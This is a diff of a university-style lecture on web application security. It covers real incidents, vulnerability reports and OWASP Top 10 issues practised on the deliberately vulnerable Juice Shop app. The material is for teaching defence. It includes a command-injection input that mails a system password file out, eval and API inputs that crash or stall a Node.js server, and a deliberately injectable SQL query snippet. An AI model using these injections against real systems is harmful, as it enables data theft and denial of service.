@@ -14,50 +14,43 @@ warning: true
 - [Required & recommended readings and activities](#required--recommended-readings-and-activities)
 - [Learning goals](#learning-goals)
 - [Introduction](#introduction)
-- [Threat categories](#threat-categories)
+- [Threat examples](#threat-examples)
   - [Defacement](#defacement)
   - [Data disclosure](#data-disclosure)
   - [Data loss](#data-loss)
   - [Denial of service](#denial-of-service)
-  - [Foot in the door](#foot-in-the-door)
-  - [Backdoors](#backdoors)
   - [Unauthorized access](#unauthorized-access)
 - [Most frequent vulnerabilities](#most-frequent-vulnerabilities)
-  - [Cyber security risk report 2016](#cyber-security-risk-report-2016)
-  - [Vulnerability statistics report 2019](#vulnerability-statistics-report-2019)
-  - [Internet security threat report 2019](#internet-security-threat-report-2019)
-- [Juice Shop](#juice-shop)
-- [OWASP Top 10 in practice](#owasp-top-10-in-practice)
+- [Juice Shop & OWASP](#juice-shop--owasp)
   - [Injection](#injection)
+    - [:bangbang: Injection attack @ Juice Shop](#bangbang-injection-attack--juice-shop)
+    - [How to avoid injection attacks](#how-to-avoid-injection-attacks)
+  - [Broken authentication](#broken-authentication)
     - [:bangbang: Juice Shop](#bangbang-juice-shop)
     - [How to avoid it](#how-to-avoid-it)
-    - [SQL injections](#sql-injections)
-  - [Broken authentication](#broken-authentication)
+  - [XSS](#xss)
     - [:bangbang: Juice Shop](#bangbang-juice-shop-1)
     - [How to avoid it](#how-to-avoid-it-1)
-  - [XSS](#xss)
+  - [Improper input validation](#improper-input-validation)
     - [:bangbang: Juice Shop](#bangbang-juice-shop-2)
     - [How to avoid it](#how-to-avoid-it-2)
-  - [Improper input validation](#improper-input-validation)
+  - [Security misconfiguration](#security-misconfiguration)
     - [:bangbang: Juice Shop](#bangbang-juice-shop-3)
     - [How to avoid it](#how-to-avoid-it-3)
-  - [Security misconfiguration](#security-misconfiguration)
+  - [Sensitive data exposure](#sensitive-data-exposure)
     - [:bangbang: Juice Shop](#bangbang-juice-shop-4)
     - [How to avoid it](#how-to-avoid-it-4)
-  - [Sensitive data exposure](#sensitive-data-exposure)
+  - [Broken access controls](#broken-access-controls)
     - [:bangbang: Juice Shop](#bangbang-juice-shop-5)
     - [How to avoid it](#how-to-avoid-it-5)
-  - [Broken access controls](#broken-access-controls)
-    - [:bangbang: Juice Shop](#bangbang-juice-shop-6)
-    - [How to avoid it](#how-to-avoid-it-6)
   - [CSRF](#csrf)
-    - [How to avoid it](#how-to-avoid-it-7)
+    - [How to avoid it](#how-to-avoid-it-6)
   - [Insecure components](#insecure-components)
+    - [:bangbang: Juice Shop](#bangbang-juice-shop-6)
+    - [How to avoid it](#how-to-avoid-it-7)
+  - [Unvalidated redirects](#unvalidated-redirects)
     - [:bangbang: Juice Shop](#bangbang-juice-shop-7)
     - [How to avoid it](#how-to-avoid-it-8)
-  - [Unvalidated redirects](#unvalidated-redirects)
-    - [:bangbang: Juice Shop](#bangbang-juice-shop-8)
-    - [How to avoid it](#how-to-avoid-it-9)
 - [Summary](#summary)
 - [Self-check](#self-check)
 
@@ -68,10 +61,9 @@ warning: true
   - :headphones: Listen to [this podcast](https://syntax.fm/show/035/keeping-up-with-the-codeashians-dealing-with-our-fast-paced-industry) on how to navigate the fast-paced Web technology industry.
   - :tv: [The Power of the Web Platform](https://github.com/feross/TheAnnoyingSite.com) - a talk by Feross Aboukhadijeh about what annoying things are possible on the web. Entertaining! Be sure to not open the accompanying website while in a quiet space.
 - Recommended readings:
-  - [Stanford's 2019 Web Security course](https://web.stanford.edu/class/cs253/) has a relevant set of slides.
+  - [Stanford's 2019 Web Security course](https://web.stanford.edu/class/cs253/) covers many web security issues in detail.
   - :closed_book: If you want to know everything there is about security, read Ross Anderson's [Security Engineering book](https://www.cl.cam.ac.uk/~rja14/book.html). [Chapter 21](http://www.cl.cam.ac.uk/%7Erja14/Papers/SEv2-c21.pdf) is most pertinent to the web security lecture (warning: this is an extensive read).
-  - [Stanford's Computer and Network Security course](https://crypto.stanford.edu/cs155/) has a number of lectures on web security (PDFs: [here](https://crypto.stanford.edu/cs155/lectures/08-browser-sec-model.pdf), [here](https://crypto.stanford.edu/cs155/lectures/10-SessionMgmt.pdf), [here](https://crypto.stanford.edu/cs155/lectures/09-web-site-sec.pdf) and [here](https://crypto.stanford.edu/cs155/lectures/11-workers-sandbox-csp.pdf)).
-  - CERN's [web security lecture](https://indico.cern.ch/event/242207/).
+  - [Stanford's Computer and Network Security course](https://cs155.github.io/Spring2019/) has a number of lectures on web security (PDFs: [here](https://cs155.github.io/Spring2019/lectures/08-web.pdf), [here](https://cs155.github.io/Spring2019/lectures/09-web-attacks.pdf) and [here](https://cs155.github.io/Spring2019/lectures/10-SessionMgmt.pdf)).
   - The [Open Web Application Security Project](https://www.owasp.org/index.php/Main_Page) provides an extensive list of practical tips, best practices and further readings on the topic.
   - [Node.js security best practices](https://medium.com/@nodepractices/were-under-attack-23-node-js-security-best-practices-e33c146cb87d).
 - Relevant scientific publications:
@@ -93,18 +85,16 @@ Web applications are an attractive target for *attackers* (also known as *malici
 
 - Web applications are open to attack from **different angles** as they rely on various software systems to run: an attacker can go after the **web server** hosting the web application, the **web browser** displaying the application and the **web application** itself. The **user**, of course, is also a point of attack.
 - Successfully attacking a web application with thousands or millions of users offers a lot of potential gain.
-- "Hacking" today does not require expert knowledge, as easy-to-use automated tools are available that test servers and applications for known vulnerabilities (e.g., [Wapiti](http://wapiti.sourceforge.net/), [w3af](http://w3af.org/)).
+- "Hacking" today does not require expert knowledge, as easy-to-use automated tools are available that test servers and applications for known vulnerabilities (e.g. [w3af](http://w3af.org/)).
 
-When developing a web application, it is useful to ask yourself **how can it be attacked?** and secure yourself against those attacks. While web applications are relatively easy to develop thanks to the tooling available today, they are difficult to secure as that step requires substantial technological understanding on the part of the developer.
+When developing a web application, it is important to ask yourself **how can it be attacked?** and secure yourself against those attacks. While web applications are relatively easy to develop thanks to the tooling available today, they are difficult to secure as that step requires substantial technological understanding on the part of the developer. Not only that, how to secure an application is also a constantly moving target, as new vulnerabilities are discovered. An obvious first step is to employ the automated tools mentioned above to fix known vulnerabilities.
 
-Large-scale web portals such as Facebook have partially "outsourced" the finding of security issues to so-called *white hat hackers* - people interested in security issues that earn money from testing companies' defenses and pointing them towards specific security issues. [By 2016, Facebook, for example, had paid out millions in *bug bounties*](https://www.facebook.com/notes/facebook-bug-bounty/facebook-bug-bounty-5-million-paid-in-5-years/1419385021409053/), while [Google paid 36K to a single bug hunter](https://www.cnbc.com/2018/05/26/teenager-wins-36k-from-google-bug-bounty-program.html) once.
-Bug bounty programs are run to this day by, among others, [Facebook](https://www.facebook.com/whitehat), [Google](https://www.google.com/about/appsecurity/reward-program/), [PayPal](https://www.paypal.com/us/webapps/mpp/security-tools/reporting-security-issues), [Quora](https://engineering.quora.com/Security-Bug-Bounty-Program), [Mozilla](https://www.mozilla.org/en-US/security/bug-bounty/) and [Microsoft](https://www.microsoft.com/en-us/msrc/bounty).
+Large-scale web portals such as Facebook have partially outsourced the finding of security issues to so-called *white hat hackers* - people interested in security issues that earn money from testing companies' defenses and pointing them towards specific security issues. [By 2016, Facebook, for example, had paid out millions in *bug bounties*](https://www.facebook.com/notes/facebook-bug-bounty/facebook-bug-bounty-5-million-paid-in-5-years/1419385021409053/) ([GitHub has reached a similar payment number in 2020](https://github.blog/2020-03-25-six-years-of-the-github-security-bug-bounty-program/)), while [Google paid 36K to a single bug hunter](https://www.cnbc.com/2018/05/26/teenager-wins-36k-from-google-bug-bounty-program.html) once.
+Bug bounty programs are run by, among others, [Facebook](https://www.facebook.com/whitehat), [Google](https://www.google.com/about/appsecurity/reward-program/), [PayPal](https://www.paypal.com/us/webapps/mpp/security-tools/reporting-security-issues), [Quora](https://engineering.quora.com/Security-Bug-Bounty-Program), [Mozilla](https://www.mozilla.org/en-US/security/bug-bounty/) and [Microsoft](https://www.microsoft.com/en-us/msrc/bounty). Even [Stanford University](https://uit.stanford.edu/security/bug-bounty) runs its own bug bounty program.
 
-[Even Stanford University runs its own bug bounty program!](https://uit.stanford.edu/security/bug-bounty).
+## Threat examples
 
-## Threat categories
-
-There are a number of overarching categories for threats against web applications. We introduce each of them with a concrete security incident.
+Before diving into what causes web applications to be vulnerable on a technical level, we introduce major threats web applications face with a number of real-world examples.
 
 ### Defacement
 
@@ -124,19 +114,21 @@ Another example is the [2015 defacement attack against Lenovo](https://www.thegu
 
 ### Data disclosure
 
-Data disclosure is a threat that is in the news again, when a large company fails to protect sensitive or confedential information from users who should not have access to it - the most recent example (as of 09/2019) being [Facebook's leak of 419 million users' phone numbers](https://techcrunch.com/2019/09/04/facebook-phone-numbers-exposed/).
+Data disclosure is a threat that is in the news, when a large company fails to protect sensitive or confedential information from users who should not have access to it - a recent example being [Facebook's leak of 419 million users' phone numbers](https://techcrunch.com/2019/09/04/facebook-phone-numbers-exposed/).
 
-A less well-known example is a [2015 attack against VTech](http://www.computerworld.com/article/3009236/cybercrime-hacking/massive-vtech-hack-exposes-data-of-nearly-5-million-parents-and-over-200-000-kids.html), a global toy producer. In this instance the attackers gained access to nearly 5 million records of parents including their email addresses and passwords. Worst of all, while the passwords were stored encrypted, the security questions were stored in plain text, making them an easy target to exploit.
+A less well-known example is a [2015 attack against VTech](http://www.computerworld.com/article/3009236/cybercrime-hacking/massive-vtech-hack-exposes-data-of-nearly-5-million-parents-and-over-200-000-kids.html), a global toy producer. In this instance the attackers gained access to nearly 5 million records of parents including their email addresses and passwords. Worst of all, while the passwords were stored encrypted, the security questions were stored in plain text, making them an easy target to exploit. This is problematic because many people reuse the same passwords and security questions across applications.
 
 ### Data loss
 
 This threat is the most devastating for organizations that do not have proper backups in place: attackers are deleting data from servers they infiltrate.
 
-Code Spaces ([snapshot of their website in 2014](https://web.archive.org/web/20140219025823/http://www.codespaces.com:80/)) used to be a company providing secure hosting options and project management services for companies. Until the day the [*Murder in the Amazon cloud*](http://www.infoworld.com/article/2608076/data-center/murder-in-the-amazon-cloud.html) happened - the title of the article is not an exaggeration. Code Spaces was built on Amazon Web Services (AWS), one of the major cloud computing platform providers used by many companies due to their reliable service at predictable cost. Services on demand tend to be cheaper and easier to work with than running and maintaining one's own hardware. AWS has an easy to use interface to spin up servers - a Web interface that has (of course) an authentication step built-in: 
+Code Spaces ([snapshot of their website in 2014](https://web.archive.org/web/20140219025823/http://www.codespaces.com:80/)) used to be a company providing secure hosting options and project management services for companies. Until the day the [*Murder in the Amazon cloud*](http://www.infoworld.com/article/2608076/data-center/murder-in-the-amazon-cloud.html) happened - the title of the article is not an exaggeration. Code Spaces was built on Amazon Web Services (AWS), one of the major cloud computing platform providers used by many companies due to their reliable service at predictable cost. Services on demand tend to be cheaper and easier to work with than running and maintaining one's own hardware. AWS has an easy to use interface to spin up servers - a Web interface that has (of course) an authentication step built-in :point_down:: 
 
 ![AWS console](../img/security-aws.png)
 
-An attacker was able to access this interface and threatened to shut down the servers and delete the data snapshots (literally possible with a click of a button) unless a ransom was paid. The company did not pay and tried to regain control of their AWS control panel. By the time this was achieved, the attacker had already deleted almost all resources. As Code Spaces had decided to run the servers **and their backups** from the same AWS account, they were all vulnerable at once. The company clients' data was gone and [Code Spaces shut down](https://web.archive.org/web/20140625045902/http://www.codespaces.com/).
+<sup>Screenshot of the AWS console in late 2019.</sup>
+
+An attacker was able to access Code Spaces' AWS console and threatened to shut down the servers and delete the data snapshots (literally possible with a click of a button) unless a ransom was paid. The company did not pay and tried to regain control of their AWS control panel. By the time this was achieved, the attacker had already deleted almost all resources. As Code Spaces had decided to run the servers **and their backups** from the same AWS account, they were all vulnerable at once. The company clients' data was gone and [Code Spaces shut down](https://web.archive.org/web/20140625045902/http://www.codespaces.com/).
 
 ### Denial of service
 
@@ -146,36 +138,25 @@ To showcase this threat we use a 2015 Steam store attack, which is extensively d
 
 A variant of a DoS attack is a *Distributed Denial of Service* (DDoS) attack where multiple systems flood a targeted system. Typically, an attacker recruits multiple vulnerable machines (or bots) to join a *Botnet* for DDoS attacks. In 2016, a major DDoS attack was carried out by the [Mirai botnet](https://www.csoonline.com/article/3258748/the-mirai-botnet-explained-how-teen-scammers-and-cctv-cameras-almost-brought-down-the-internet.html), which was composed of a number of IoT devices that were available on the Internet with default passwords.    
 
-### Foot in the door
-
-The most difficult component of a system to secure is its users. Phishing and social engineering can lead unsuspecting users to give access to some part of the secured system to attackers - this is the foot in the door. Once in, attackers try to infiltrate other internal systems.
-
-A common example (also described in this [attack on the US State Department](https://edition.cnn.com/2015/04/07/politics/how-russians-hacked-the-wh/)) is the sending of emails to government employees impersonating a colleague and requesting access to a low-level security system. Who-knows-whom can often be inferred from public appearances, the staff overview on websites, public documents, and so on. Often, access is simply granted by the unsuspecting user, despite policies to the contrary.
-
-### Backdoors
-
-After an attacker has gained access to a website, they typically want to maintain their presence by installing a *backdoor*. A backdoor is a piece of code or a vulnerability that allows an attacker to gain a foothold in a website without being noticed. In many cases, the backdoors seem benign and are hidden deep within the website code so even after a thorough clean-up of an infected website, there is a chance that the backdoor remains. 
-
-In 2016, a [Dutch software developer was arrested](https://www.bleepingcomputer.com/news/security/dutch-developer-added-backdoor-to-websites-he-built-phished-over-20-000-users/) for installing a backdoor in a website he had built for a client. As it turned out, he used the backdoor to access 20,000 clients' login credentials. He used them to conduct online purchases and to break into their social media accounts (possible since people often reuse the same credentials across platforms). 
-
 ### Unauthorized access
 
-In this threat type, attackers can use functions of a web application they should not be able to use. 
+The most difficult component of a system to secure is its users. **Phishing** and **social engineering** can lead unsuspecting users to give access to some part of the secured system to attackers. Once in, attackers try to infiltrate other internal systems.
 
-An example here is [Instagram's backend admin panel](https://www.hackread.com/instagram-hacked-researcher-gets-admin-panel-access/) which was accessible on the web while it should have only been accessible from the internal Instagram network.  
+A common example (also described in this [attack on the US State Department](https://edition.cnn.com/2015/04/07/politics/how-russians-hacked-the-wh/)) is the sending of emails to government employees impersonating a colleague and requesting access to a low-level security system. Who-knows-whom can often be inferred from public appearances, the staff overview on websites, public documents, and so on. Often, access is simply granted by the unsuspecting user, despite policies to the contrary. Recently, the [University of Maastricht paid out 30 bitcoin (about 200,000 Euros) in ransom](https://www.reuters.com/article/us-cybercrime-netherlands-university-idUSKBN1ZZ2HH) to regain access to their computer systems which had been infiltrated by attackers via phishing.
+
+Unauthorized access can also be achieved by probing web applications for functionalities that should not be accessible to the average user. An example is [Instagram's backend admin panel](https://www.hackread.com/instagram-hacked-researcher-gets-admin-panel-access/) which was accessible on the web while it should have only been accessible from the internal Instagram network.  
 
 ## Most frequent vulnerabilities
 
-In order to effectively secure a web application, it helps to know what the most frequent security issues are. We here report the major vulnerabilities as identified in three different security reports - each one collected data with a different methodology and thus we refer to all three here. Our goal is to show off the very varied attack landscape, even when only focusing on the major types of attacks.
+In order to effectively secure a web application, it helps to know what the most frequent security issues are. 
 
-### Cyber security risk report 2016
-Let us first turn to the [Cyber security risk report 2016 published by HPE](https://www.thehaguesecuritydelta.com/media/com_hsd/report/57/document/4aa6-3786enw.pdf) (in short: CSRHPE). For this report, several thousand applications (mobile, web, desktop) were sampled and their security was probed. Here, we go over some of the most important findings concerning web applications.
+Ideally, we can refer to a single report, that is updated yearly and showcases the most frequent vulnerabilities derived from a large sample of web applications. Unfortunately, due to the big business that *cybersecurity* is, many existing reports read more like an advertisement and are vague on their methodology, where the numbers come from, how the vulnerabilities were derived and so on. For this reason, we here mostly rely on the [Cyber security risk report 2016 published by HPE](https://www.thehaguesecuritydelta.com/media/com_hsd/report/57/document/4aa6-3786enw.pdf) (in short: CSRHPE). For this report, several thousand applications (mobile, web, desktop) were sampled and their security was probed. Although the report is from 2016, the major findings have been corroborated by more recent reports as well (such as the [2019 vulnerability statistics report](https://www.edgescan.com/wp-content/uploads/2019/02/edgescan-Vulnerability-Stats-Report-2019.pdf) and the [2019 Internet Security Threat Report](https://www.symantec.com/content/dam/symantec/docs/reports/istr-24-2019-en.pdf)). In this section of the lecture, we go over some of the most important findings in the CSRHPE concerning web applications.
 
 The most important **software security issues** for web and mobile applications are the following, reported as *percentage of scanned applications*:
 
 ![Web and mobile security](../img/security-security-report-1.png)
 
-<sup>Figure taken from page 56, CSRHPE.</sup>
+<sup>Most important software security issues. Figure taken from page 56, CSRHPE.</sup>
 
 :point_up: In general, mobile applications are more vulnerable than web applications; the worst issues were found in the *security features* category, which includes authentication, access control, confidentiality and cryptography issues. 99% of mobile applications had at least one issue here. The *environment* category is also problematic with 77% of web applications and 88% of mobile applications having an issue here - this refers to server misconfigurations, improper file settings, sample files and outdated software versions. The third category to mention is *input validation and representation* which covers issues such as cross-site scripting and SQL injections, that are present in most mobile applications and 44% of web applications. The latter is actually surprising, as a lot of best practices of how to secure web applications exist - clearly though, these recommendations are often ignored.
 
@@ -183,25 +164,27 @@ If we zoom in on the non-mobile applications, the ten most commonly occurring vu
 
 ![Top 10 vulnerabilities](../img/security-security-report-2.png)
 
-<sup>Figure taken from page 57, CSRHPE.</sup>
+<sup>Top 10 vulnerabilities. Figure taken from page 57, CSRHPE.</sup>
 
 :point_up: Some of these vulnerabilities you should already recognize and be able to place in context, specifically *Cookie Security: cookie not sent over SSL* and *Cookie Security: HTTPOnly not set*. The vulnerability *Privacy violation: autocomplete* should intuitively make sense: auto-completion is a feature provided by modern browsers; browsers store information submitted by the user through `<input>` fields. The browser can then offer autocompletion for subsequent forms with similar field names. If sensitive information is stored in this manner, a malicious actor can provide a form to a user that is then auto-filled with sensitive values and transmitted back to the attacker. For this reason, it is often worthwhile to [switch off autocompletion](https://developer.mozilla.org/en-US/docs/Web/Security/Securing_your_site/Turning_off_form_autocompletion) for sensitive input fields.
 
 :point_up: Lastly, let's discuss the *Hidden field* vulnerability. It provides developers with a simple manner of including data that should not be seen/modified by users when a `<form>` is submitted. For example, a web portal may offer the same form on every single web page and the hidden field stores a numerical identifier of the specific page (or route) the form was submitted from. However, as with any data sent to the browser, with a bit of knowledge about the dev tools available in modern browsers, the user can easily change the hidden field values, which creates a vulnerability if the server does not validate the correctness of the returned value.
 
-Taking a slightly higher-level view, the top five violated security categories across all scanned applications are the following, reported as *percentage of applications violating a category*:
+Taking a slightly higher-level view, the top five violated security categories across all scanned applications are the following, reported as *percentage of applications violating a category* :point_down::
 
 ![Top 5 violated security categories](../img/security-security-report-3.png)
 
-<sup>Figure taken from page 59, CSRHPE.</sup>
+<sup>Top 5 violoated security categories. Figure taken from page 59, CSRHPE.</sup>
 
-The only category not covered so far is *Insecure transport*. This refers to the fact that applications rely on insecure communication channels or weakly secured channels to transfer sensitive data. Nowadays, at least for login/password fields, the modern browsers provide a warning to the user indicating the non-secure nature of the connection, as seen in this example :point_down::
+:point_up: The only category not covered so far is *Insecure transport*. This refers to the fact that applications rely on insecure communication channels or weakly secured channels to transfer sensitive data. Nowadays, at least for login/password fields, the modern browsers provide a warning to the user indicating the non-secure nature of the connection, as seen in this example :point_down::
 
 ![Juice Shop not secure](../img/security-browser-warning-juiceshop.png)
 
+<sup>Firefox's warning when attempting login via http (instead of https).</sup>
+
 It is worth noting that in recent years browsers have implemented support for the `Strict-Transport-Security` header, which allows web applications to inform the browser that it should **only** be accessed via HTTPS. This prevents attacks such as described in this [MDN article on `Strict-Transport-Security`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security):
 
-```console
+```
 You log into a free WiFi access point at an airport and start surfing the web, visiting your
 online banking service to check your balance and pay a couple of bills. Unfortunately, the
 access point you're using is actually a hacker's laptop, and they're intercepting your original
@@ -214,83 +197,99 @@ to automatically use only HTTPS, which prevents hackers from performing this
 sort of man-in-the-middle attack.
 ```
 
-### Vulnerability statistics report 2019
+## Juice Shop & OWASP
 
-The [2019 vulnerability statistics report](https://www.edgescan.com/wp-content/uploads/2019/02/edgescan-Vulnerability-Stats-Report-2019.pdf) (short: edgescan VSR) published by edgescan reviews major security weaknesses by analyzing the 2018 [Common Vulnerabilities and Exposures](https://cve.mitre.org/) (in short: CVE). CVE is a repository of known vulnerabilities in software systems. Their analysis shows that the global state of cybersecurity is such that organizations still do not have _situational awareness_: if they do not know what is wrong, they cannot even begin to fix it.
+The best way to learn about web security is to try out the introduced techniques in an actual web application that is vulnerable. As we have covered JavaScript/Node.js, a vulnerable web application that is written in JavaScript/Node.js will be most useful to us.
 
-edgescan distinguishes between two levels of vulnerabilities: (i) *web application layer vulnerabilities* that cover weaknesses in the web applications themselves such as insecure sever configuration, client-side security, and injection attacks; (ii) *infrastructure layer vulnerabilities* that cover weaknesses in the underlying platform and include deprecated protocol support, poor implementation, and weak configurations. While 81% of the vulnerabilities belong to the infrastructure layer, the 19% vulnerabilities in the web application layer are more high-risk from a security breach standpoint :point_down:: 
+The [OWASP Juice Shop application](https://owasp.org/www-project-juice-shop/) was designed specifically for this purpose. It is an insecure web application written in JavaScript (using Node.js/Express/Angular) that contains a wide range of vulnerabilities. 
 
-![Most frequent web vulnerabilities](../img/security-security-report-4.png)
+:bangbang: [Juice Shop's GitHub repository](https://github.com/bkimminich/juice-shop) comes with detailed installation instructions that allow you to install it locally on your machine or in the cloud. We strongly suggest you to do so, and to follow the practical guide we provide in the next sections. More specifically, we suggest to use the [Docker container setup](https://github.com/bkimminich/juice-shop#docker-container) - if you need help installing Docker or Juice Shop, please ask the student assistants during lab hours!
 
-<sup>Source: edgescan VSR, page 8.</sup>
+Note that Juice Shop also comes with an [official companion guide](https://github.com/bkimminich/juice-shop#official-companion-guide) that contains an overview of all existing vulnerabilities. We cover only a small part of those.
 
-:point_up: The figure shows the most relevant security vulnerabilities with respect to the content of this lecture. These vulnerabilities form 74.8% of well web vulnerabilities analyzed by edgescan. Each category is color-coded to show off the related topics discussed in this lecture.  
+OWASP is an acronym and stands for [Open Web Application Security Project](https://www.owasp.org) and is an organization whose mission is to improve software security. Creating a vulnerable application to showcase the worst security issues is one way to train software engineers in web security. The [OWASP Top 10](https://owasp.org/www-project-top-ten/) vulnerabilities are those vulnerabilities that - by consensus among security experts - are the most critical security risks to web applications.
 
-:point_up: _Cross-site scripting_, _vulnerable components_ and _injection attacks_ are the key three vulnerabilities in 2018. _Cross-site scripting_ (XSS) exists generally due to poor contextual output encoding. _Vulnerable components_ refer to platform vulnerabilities that are already known (have associated CVEs) but are still unpatched. _Broken authentication_ covers weak passwords and weaknesses in session management. _Injection_ covers both SQL injection (database attack via vulnerable web applications) and other injection attacks that provide stepping stones for hijacking the application server and the associated network. _System exposure_ refers to security misconfigurations like exposed admin console, insecure defaults and directory traversal attacks that allow an attacker to freely browse different directories. _Malicious file upload_ refers to a category of improper input validation where an attacker can successfully upload malicious files to a web application in the absence of proper format and security checks. _Sensitive data exposure_ refers to the availability of sensitive credentials or business information to attackers. One way of leaking such information is through overly detailed error messages. _Authorization issues_ refer to broken access control where an attacker can perform unauthorized data and functional privilege escalation. _Open redirects_ is a category of unvalidated redirects where a web application accepts untrusted user input containing URLs. Finally, _cross-site request forgery_ (CSRF) allows an attacker to force users to execute unwanted actions on a web application they are currently authenticated to.
-
-
-### Internet security threat report 2019
-
-The [Internet Security Threat Report](https://www.symantec.com/content/dam/symantec/docs/reports/istr-24-2019-en.pdf) (in short: ISTR) published by Symantec outlines the threat landscape as seen in early 2019. They determine the trends using telemetry collected from over 123 million sensors that monitor activities of over 300,000 organizations that use Symantec's protection services. We look at a few relevant trends:
-
-1. In general, web attacks on endpoints (host machines) have increased by 56% in the year 2018 (compared to 2017). Semantec analyzed over 1.5 billion web requests each day. 348 million web attacks were blocked in total, averaging 953K attacks per day. 
-2. Spear phishing is the most prevalent infection vector used by attackers; attackers are more likely to use malicious attachments rather than malicious URLs to spread infections. Nearly half of the malicious email attachments are Microsoft Office files, which are disguised either as invoices or email delivery-failure notifications.
-3. Mobile security remains a major concern: one in 36 mobile phones has a high-risk application installed. Additionally, ransomware attacks on mobile phones have increased by 33% in 2018. _Ransomware_ is a type of financial malware that makes important files on a system inaccessible by encrypting them, unless a ransom is paid.  
-4. _Formjacking_ is one of the leading threats faced by e-commerce sites, i.e., the use of malicious JavaScript code to steal information from payment forms on the checkout pages of e-commerce sites. Semantec detected and blocked 3.7 million formjacking attacks in 2018, with most of the attacks happening in the last quarter of the year. This number is based on the 1.5 billion web requests they see each day.
-
-## Juice Shop
-
-One of the best ways to learn about web security is to try out a few of the introduced techniques in an actual web application that is vulnerable. As we have covered JavaScript/Node.js, a vulnerable web application that is written in JavaScript/Node.js will be most useful to us.
-
-The [OWASP Juice Shop Tool project](https://www.owasp.org/index.php/OWASP_Juice_Shop_Project) was designed specifically for this purpose. It is a modern and sophisticated - while at the same time insecure - web application written in JavaScript (using Node.js/Express/Angular) and *"encompasses vulnerabilities from the entire OWASP Top 10 along with many other security flaws found in real-world applications"*. OWASP stands for [Open Web Application Security Project](https://www.owasp.org) and is an organization whose mission is to improve software security. Creating a vulnerable application to showcase the worst security issues is one way to train software engineers in web security.
-
-The Juice Shop project is a realistic online juice shop - we already saw a glimpse of it in the previous section. It features a number of web application vulnerabilities as security challenges with varying difficulties. 
-
-Additionally, it comes with a companion guide called [Pwning OWASP Juice Shop](https://leanpub.com/juice-shop), which explains the vulnerabilities and how to exploit them.
-
-## OWASP Top 10 in practice
-
-In the following sections, we will discuss the OWASP Top 10 vulnerabilities (derived by consensus from security experts) on the example of Juice Shop. We have pointed out these issues already a few times in the three security reports. Here, we do not only point them out, but also explain them in detail.
+In the following sections, we will discuss the OWASP Top 10 vulnerabilities (in no particular order) on the example of Juice Shop.
 
 ### Injection
 
-Injection attacks exploit the fact that input is interpreted by the server without any checks. A malicious user can create input that leads to unintended command executions on the server.
+**Injection attacks** exploit the fact that input is interpreted by the server without any checks. A malicious user can create input that leads to unintended command executions on the server.
 
 Input for injection attacks can be created via:
 
-- Parameter manipulation of HTML forms (e.g. input fields are filled with JavaScript code);
+- parameter manipulation of HTML forms (e.g. input fields are filled with JavaScript code);
 - URL parameter manipulation;
 - HTTP header manipulation;
-- Hidden form field manipulation;
-- Cookie manipulation.
+- hidden form field manipulation;
+- cookie manipulation.
 
-Injection attacks on the server can take multiple forms, we first consider **OS command injection**:
+Injection attacks on the server can take multiple forms, we first consider **OS command injection** :point_down::
 
 ![OS command injection](../img/security-os-command-injection.png)
+
+<sup>OS command injection.</sup>
 
 :point_up: Here, we have a web portal that allows a user to sign up to a newsletter. The form looks simple enough: one `<input type="text">` element and a `<button>` to submit the form. On the server-side, a bash script takes a fixed confirmation string (stored in file `confirm`) and sends an email to the email address as stated in the user's input (*Thank you for signing up for our mailing list.*). This setup of course assumes, that the user actually used an email address as input. Let's look at benign and malicious user input:
 
 - The benign input `john@test.nl` leads to the following OS command: `cat confirm|mail john@test.nl`. This command line is indeed sufficient to send an email, as Linux has a command line [mail](https://linux.die.net/man/1/mail) tool.
 - An example of malicious input is the following: `john@test.nl; cat /etc/password | mail john@test.nl`. If the input is not checked, the server-side command line will look as follows: `cat confirm | mail john@test.nl; cat /etc/password | mail john@test.nl`. Now, two emails are sent: the confirmation email and a mail sending the server's file `/etc/password` to `john@test.nl`. This is clearly *unintended code execution*.
 
-Web applications that do not validate their input are also attackable, if they interpret the user's input as JavaScript code snippet. Imagine a calculator web application that allows a client to provide a formula, that is then send to the server, executed with the result being sent back to the client. JavaScript offers an [`eval()`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval) function that takes a string representing JavaScript code and runs it, e.g. the string `100*4+2` can be evaluated with `eval('100*4+2')`, resulting in `402`. However, a malicious user can also input `while(1)` or [`process.exit()`](https://nodejs.org/api/process.html#process_process_exit_code); the former leads the event loop to be stuck forever in the while loop, while the latter instructs Node.js to terminate the running process. Both of these malicious inputs constitute a denial of service attack.
+The main issue here is the lack of **input validation**. It should not be assumed that any input is the desired/wanted input, this has to be validated.
+
+Lets look at another instance of an injection attack. Imagine a calculator web application that allows a client to provide a formula, which is sent to the server, evaluated on the server inside a Node.js script, and the final result is sent back to the client. JavaScript offers an [`eval()`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval) function that takes a string representing JavaScript code and runs it, e.g. the string `100*4+2` can be evaluated with `eval('100*4+2')`, resulting in `402`. However, a malicious user can also try to input `while(1)` or [`process.exit()`](https://nodejs.org/api/process.html#process_process_exit_code); the former leads the Node.js event loop to be stuck forever in the while loop, while the latter instructs Node.js to terminate the running process.
 
 `eval()` in fact is so dangerous that [it should never be used](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval#Do_not_ever_use_eval!).
 
-#### :bangbang: Juice Shop
+Lastly, lets consider **SQL injection** attacks. They are a regular occurrence when input is not validated (we will repeat the input-validation-mantra a few more times throughout this lecture). Consider this example code snippet below :point_down::
 
-1. To try out this attack, head to the Juice Shop installation at https://juice-shop.herokuapp.com/.
-2. You can access the user reviews using the backend API `/rest/products/{id}/reviews`.
-3. To see the first customer's review, go to: https://juice-shop.herokuapp.com/rest/products/1/reviews. You will see the review in JSON format.
-4. Try out a few other values for `{id}`.
-5. This indicates that the `{id}` is processed by the server as a user input. Let's see if we can execute commands using it.
-6. Replace `{id}` with `sleep(2000)` and press Enter. You will observe that the server takes roughly 2 seconds to respond. This is because the `sleep(x)` command takes an integer as input that makes the program sleep for `x` ms.
-7. To avoid real Denial of Service attacks, the Juice Shop will sleep for a maximum of 2 seconds. 
-8. **Dangerous**: If you replace `{id}` with `process.exit()`, the application will crash and will need to be redeployed. Be **VERY** careful with this because you, and your fellow study colleagues, will not be able to access Juice Shop for the next few minutes!
+```javascript
+let n = /* code to retrieve user provided name */
+let p = /* code to retrieve user provided password */
 
-#### How to avoid it
+/* a database table 'users' holds our user data */
+let sqlQuery = "select * from users where name = '"+u+"' and password = '" + p + "'";
+/* execute query */
+```
 
